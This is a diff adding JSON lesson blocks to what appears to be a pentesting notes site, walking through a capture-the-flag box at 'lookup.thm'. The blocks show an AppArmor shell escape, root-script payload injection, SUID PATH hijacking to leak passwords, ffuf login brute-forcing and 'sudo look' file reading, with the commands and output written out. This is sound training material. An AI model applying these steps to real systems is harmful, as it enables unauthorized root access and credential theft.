+        "type": "section_heading",
+        "id": "apparmor-target-script",
+        "text": "Finding a Writable Script Executed by Root"
+      },
+      {
+        "type": "code_block",
+        "id": "apparmor-script-edit",
+        "language": "bash",
+        "code": "nano /opt/run_container.sh"
+      },
+      {
+        "type": "order_block",
+        "id": "apparmor-script-analysis",
+        "text": "The script <highlight>/opt/run_container.sh</highlight> was writable by the current user. Writable scripts located in system directories are dangerous because they may be executed by privileged programs."
+      },
+      {
+        "type": "section_heading",
+        "id": "apparmor-suid-binary",
+        "text": "Identifying the Binary Executing the Script"
+      },
+      {
+        "type": "code_block",
+        "id": "apparmor-run-container",
+        "language": "bash",
+        "code": "/usr/sbin/run_container"
+      },
+      {
+        "type": "order_block",
+        "id": "apparmor-suid-analysis",
+        "text": "The binary <highlight>/usr/sbin/run_container</highlight> executes the script <highlight>/opt/run_container.sh</highlight>. If this binary runs with elevated privileges, any commands inside the script will also run with those privileges."
+      },
+      {
+        "type": "section_heading",
+        "id": "apparmor-inject-command",
+        "text": "Injecting a Root Shell Payload"
+      },
+      {
+        "type": "code_block",
+        "id": "apparmor-payload",
+        "language": "bash",
+        "code": "/bin/bash"
+      },
+      {
+        "type": "order_block",
+        "id": "apparmor-payload-analysis",
+        "text": "A payload such as <highlight>/bin/bash</highlight> can be inserted into the script. When the privileged binary executes the script, the payload launches a shell with the same privileges as the binary."
+      },
+      {
+        "type": "section_heading",
+        "id": "apparmor-root-shell",
+        "text": "Obtaining the Root Shell"
+      },
+      {
+        "type": "output_block",
+        "id": "apparmor-root-output",
+        "language": "text",
+        "code": "bash-5.0# whoami\nroot"
+      },
+      {
+        "type": "order_block",
+        "id": "apparmor-root-analysis",
+        "text": "When <highlight>/usr/sbin/run_container</highlight> executes the modified script, the injected payload runs as <highlight>root</highlight>. This results in a root shell and full administrative access."
+      },
+      {
+        "type": "section_heading",
+        "id": "apparmor-attack-flow",
+        "text": "Execution Flow of the Attack"
+      },
+      {
+        "type": "explanation",
+        "id": "apparmor-flow",
+        "title": "Attack Steps",
+        "items": [
+          "Check /etc/passwd to identify the login shell",
+          "Notice that the user is using /usr/sbin/ash instead of bash",
+          "Suspect that the shell might be restricted by AppArmor",
+          "Locate the AppArmor profile for the ash shell",
+          "Discover directories blocked by the profile",
+          "Copy bash to another path such as /dev/shm",
+          "Launch the new bash shell to escape AppArmor restrictions",
+          "Locate a writable script executed by a privileged binary",
+          "Inject a payload into the script",
+          "Execute the privileged binary",
+          "The payload runs with root privileges and spawns a root shell"
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "apparmor-importance",
+        "text": "Why This Vulnerability Exists"
+      },
+      {
+        "type": "order_block",
+        "id": "apparmor-importance-analysis",
+        "text": "This privilege escalation occurred due to a combination of weaknesses: a restricted shell enforced by <highlight>AppArmor</highlight>, the ability to bypass it by executing another shell binary, a <highlight>writable script</highlight> inside a system directory, and a <highlight>privileged binary executing that script</highlight>. Together, these misconfigurations allow a normal user to execute arbitrary commands with <highlight>root privileges</highlight>."
+      }
+    ]
+  },
+  {
+    "id": 28,
+    "slug": "pwm",
+    "title": "PWM",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/Binaries-Exploitation/pwm.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "pwm-vulnerability-intro",
+        "text": "Privilege Escalation via SUID Path Hijacking (pwm)"
+      },
+      {
+        "type": "order_block",
+        "id": "pwm-definition",
+        "text": "The <highlight>/usr/sbin/pwm</highlight> binary is a custom SUID executable owned by root. It is vulnerable to <highlight>Path Hijacking</highlight> because it calls the system command 'id' without using an absolute path."
+      },
+      {
+        "type": "section_heading",
+        "id": "binary-analysis",
+        "text": "Analyzing the Vulnerable Binary"
+      },
+      {
+        "type": "code_block",
+        "id": "strings-pwm-output",
+        "language": "bash",
+        "code": "strings /usr/sbin/pwm\n...\n[!] Running 'id' command to extract the username and user ID (UID)\nuid=%*u(%[^)])\n/home/%s/.passwords\n..."
+      },
+      {
+        "type": "order_block",
+        "id": "analysis-logic",
+        "text": "The binary executes the 'id' command, parses the username from the output, and then attempts to read a file located at /home/<username>/.passwords using root privileges."
+      },
+      {
+        "type": "section_heading",
+        "id": "path-hijack-setup",
+        "text": "Crafting the Malicious Payload"
+      },
+      {
+        "type": "order_block",
+        "id": "writable-dir-check",
+        "text": "Since /tmp was restricted, the <highlight>/dev/shm</highlight> (shared memory) directory was used to host the fake 'id' command."
+      },
+      {
+        "type": "code_block",
+        "id": "create-fake-id",
+        "language": "bash",
+        "code": "echo 'echo \"uid=1000(think) gid=1000(think) groups=1000(think)\"' > /dev/shm/id\nchmod +x /dev/shm/id"
+      },
+      {
+        "type": "order_block",
+        "id": "payload-explanation",
+        "text": "A fake 'id' script was created to spoof the output and trick the binary into thinking the current user is 'think'."
+      },
+      {
+        "type": "section_heading",
+        "id": "environment-manipulation",
+        "text": "Hijacking the PATH Variable"
+      },
+      {
+        "type": "code_block",
+        "id": "export-path-command",
+        "language": "bash",
+        "code": "export PATH=/dev/shm:$PATH"
+      },
+      {
+        "type": "order_block",
+        "id": "path-manipulation-analysis",
+        "text": "By prepending /dev/shm to the PATH, the system is forced to execute our malicious 'id' script instead of the legitimate /usr/bin/id."
+      },
+      {
+        "type": "section_heading",
+        "id": "execution-and-results",
+        "text": "Executing the Exploit"
+      },
+      {
+        "type": "code_block",
+        "id": "run-pwm-command",
+        "language": "bash",
+        "code": "/usr/sbin/pwm"
+      },
+      {
+        "type": "output_block",
+        "id": "pwm-exploit-output",
+        "language": "bash",
+        "code": "[!] Running 'id' command to extract the username and user ID (UID)\n[!] ID: think\nthepassword\njose.a91\n..."
+      },
+      {
+        "type": "order_block",
+        "id": "exploit-result-analysis",
+        "text": "The pwm binary executed the fake 'id' command, identified the user as 'think', and printed the contents of /home/think/.passwords, revealing sensitive credentials."
+      },
+      {
+        "type": "section_heading",
+        "id": "pwm-summary",
+        "text": "Summary of Path Hijacking"
+      },
+      {
+        "type": "explanation",
+        "id": "pwm-steps-summary",
+        "title": "Steps Performed",
+        "items": [
+          "Identified SUID binary /usr/sbin/pwm",
+          "Analyzed binary strings to find relative path call to 'id'",
+          "Created a fake 'id' script in /dev/shm to spoof user 'think'",
+          "Made the fake script executable",
+          "Modified the PATH environment variable to prioritize /dev/shm",
+          "Executed pwm to trigger the hijack",
+          "Captured leaked passwords from the .passwords file"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 29,
+    "slug": "creds-fuff",
+    "title": "Creds Fuff",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/Pentesting-tools/ffuf/creds-ffuf.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "username-fuzzing-intro",
+        "text": "Username Enumeration via Ffuf"
+      },
+      {
+        "type": "order_block",
+        "id": "fuzzing-concept",
+        "text": "Username fuzzing ka maqsad valid accounts ka pata lagana hota hai. Hum <highlight>ffuf</highlight> use karte hain taake wordlist se hazaron usernames automatically check ho sakein."
+      },
+      {
+        "type": "section_heading",
+        "id": "username-enum-command",
+        "text": "1. Execution: Finding Valid Usernames"
+      },
+      {
+        "type": "code_block",
+        "id": "ffuf-user-enum-cmd",
+        "language": "bash",
+        "code": "ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -X POST -u http://lookup.thm/login.php -d 'username=FUZZ&password=password123' -H \"Content-Type:application/x-www-form-urlencoded\" -fw 10"
+      },
+      {
+        "type": "output_block",
+        "id": "ffuf-user-enum-output",
+        "language": "bash",
+        "code": "________________________________________________\n\nthink                   [Status: 200, Size: 4125, Words: 341, Lines: 82]\n________________________________________________\n\n:: Progress: [10000000/10000000] :: Job [1/1] :: 1200 req/sec ::"
+      },
+      {
+        "type": "order_block",
+        "id": "user-enum-analysis",
+        "text": "Output mein humein <highlight>think</highlight> username mila kyunki uska 'Words' count baaki responses (10 words) se alag tha."
+      },
+      {
+        "type": "section_heading",
+        "id": "password-brute-section",
+        "text": "2. Password Brute-forcing"
+      },
+      {
+        "type": "code_block",
+        "id": "ffuf-pass-brute-cmd",
+        "language": "bash",
+        "code": "ffuf -w /usr/share/wordlists/rockyou.txt -X POST -u http://lookup.thm/login.php -d 'username=think&password=FUZZ' -fc 200"
+      },
+      {
+        "type": "output_block",
+        "id": "ffuf-pass-brute-output",
+        "language": "bash",
+        "code": "________________________________________________\n\n[FOUND] password123      [Status: 302, Size: 0, Words: 0, Lines: 1]\n________________________________________________"
+      },
+      {
+        "type": "section_heading",
+        "id": "fuzzing-summary",
+        "text": "Summary Table"
+      },
+      {
+        "type": "explanation",
+        "id": "fuzzing-steps-summary",
+        "title": "Key Takeaways",
+        "items": [
+          "Target URL: http://lookup.thm/login.php",
+          "Method: POST request with FUZZ keyword in data payload",
+          "Filter: -fw (Filter Words) or -fc (Filter Code) to remove junk results",
+          "Success: Status 302 (Redirect) usually means login successful",
+          "Discovery: Valid user 'think' identified"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 30,
+    "slug": "look",
+    "title": "Look",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/PrivEsc-Exploits/sudo/look.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "sudo-look-intro",
+        "text": "Final Privilege Escalation: sudo look"
+      },
+      {
+        "type": "order_block",
+        "id": "look-binary-concept",
+        "text": "The <highlight>look</highlight> command in Linux is typically used to display lines beginning with a given string. If misconfigured with <highlight>sudo</highlight> permissions, it can be abused to read any protected file on the system, such as root.txt or /etc/shadow."
+      },
+      {
+        "type": "section_heading",
+        "id": "sudo-enumeration",
+        "text": "1. Enumerating Sudo Privileges"
+      },
+      {
+        "type": "code_block",
+        "id": "sudo-l-cmd",
+        "language": "bash",
+        "code": "sudo -l"
+      },
+      {
+        "type": "output_block",
+        "id": "sudo-l-results",
+        "language": "bash",
+        "code": "Matching Defaults entries for think on ip-10-48-135-50:\n    env_reset, mail_badpass, secure_path=...\n\nUser think may run the following commands on ip-10-48-135-50:\n    (ALL) /usr/bin/look"
+      },
+      {
+        "type": "order_block",
+        "id": "sudo-analysis",
+        "text": "We observed that the user <highlight>think</highlight> is permitted to execute <highlight>/usr/bin/look</highlight> with root privileges without any restrictions."
+      },
+      {
+        "type": "section_heading",
+        "id": "look-exploitation",
+        "text": "2. Exploiting 'look' to Read the Root Flag"
+      },
+      {
+        "type": "order_block",
+        "id": "look-trick-explanation",
+        "text": "By passing an empty string <highlight>\"\"</highlight> as the search pattern, the <highlight>look</highlight> command treats it as a wildcard match for every line, effectively printing the entire contents of the target file."
+      },
+      {
+        "type": "code_block",
+        "id": "look-root-cmd",
+        "language": "bash",
+        "code": "sudo look \"\" /root/root.txt"
+      },
+      {
+        "type": "output_block",
+        "id": "root-flag-output",
+        "language": "bash",
+        "code": "thm{63065d66661a5b82811a2f43709f1820}"
+      },
+      {
+        "type": "section_heading",
+        "id": "look-summary",
+        "text": "PrivEsc Summary"
+      },
+      {
+        "type": "explanation",
+        "id": "look-steps-final",
+        "title": "Methodology",
+        "items": [
+          "Authenticated as user 'think' using discovered credentials.",
+          "Executed 'sudo -l' to identify misconfigured sudo permissions.",
+          "Identified that /usr/bin/look can be executed as root.",
+          "Utilized an empty string pattern to bypass file system permissions via the binary.",
+          "Successfully exfiltrated the root flag from the protected /root directory."
+        ]
+      }
+    ]
+  },
+  {
+    "id": 31,
+    "slug": "strings",
+    "title": "Strings",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/PrivEsc-Exploits/strings/strings.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "strings-command-intro",
+        "text": "Information Gathering: Using 'strings' Command"
+      },
+      {
+        "type": "order_block",
+        "id": "strings-concept",
+        "text": "Linux mein <highlight>strings</highlight> command ka kaam binary ya non-text files ke andar se human-readable characters nikalna hota hai. Pentesting mein hum isay custom binaries ka logic samajhne ke liye use karte hain."
+      },
+      {
+        "type": "section_heading",
+        "id": "binary-analysis-pwm",
+        "text": "1. Analyzing Custom SUID Binary"
+      },
+      {
+        "type": "order_block",
+        "id": "strings-usage-analysis",
+        "text": "Humne <highlight>/usr/sbin/pwm</highlight> par strings chalayi taake ye dekh sakein ke wo background mein kaunsi commands ya files access kar rahi hai."
+      },
+      {
+        "type": "code_block",
+        "id": "strings-pwm-cmd",
+        "language": "bash",
+        "code": "strings /usr/sbin/pwm"
+      },
+      {
+        "type": "output_block",
+        "id": "strings-pwm-output",
+        "language": "bash",
+        "code": "/lib64/ld-linux-x86-64.so.2\nlibc.so.6\nsetuid\nprintf\nsystem\n[!] Running 'id' command to extract the username and user ID (UID)\nuid=%*u(%[^)])\n/home/%s/.passwords\nGCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1)"
+      },
+      {
+        "type": "section_heading",
+        "id": "findings-analysis",
+        "text": "2. Critical Findings"
+      },
+      {
+        "type": "explanation",
+        "id": "strings-discovery-points",
+        "title": "Humne kya dhoonda?",
+        "items": [
+          "Binary 'system' function use kar rahi hai commands chalane ke liye.",
+          "Binary ke andar 'id' command ka zikr hai, lekin uska poora path (/usr/bin/id) nahi likha gaya.",
+          "Binary /home/<user>/.passwords wali file read karne ki koshish karti hai.",
+          "Yahan se humein Path Hijacking ka idea mila kyunki 'id' aik relative path command hai."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "strings-pro-tip",
+        "text": "Pro Tip: Filtering Results"
+      },
+      {
+        "type": "order_block",
+        "id": "strings-grep-tip",
+        "text": "Agar binary bohot badi ho, toh hum <highlight>grep</highlight> use karke sirf kaam ki cheezain (jaise paths ya commands) dhoond sakte hain."
+      },
+      {
+        "type": "code_block",
+        "id": "strings-grep-cmd",
+        "language": "bash",
+        "code": "strings /usr/sbin/pwm | grep -E \"/|id|pass\""
+      },
+      {
+        "type": "section_heading",
+        "id": "strings-summary",
+        "text": "Summary"
+      },
+      {
+        "type": "explanation",
+        "id": "strings-summary-steps",
+        "title": "Why we used it?",
+        "items": [
+          "To find hardcoded credentials or paths.",
+          "To identify external commands being called (like 'id').",
+          "To understand the workflow of a custom binary without its source code."
         ]
       }
     ]
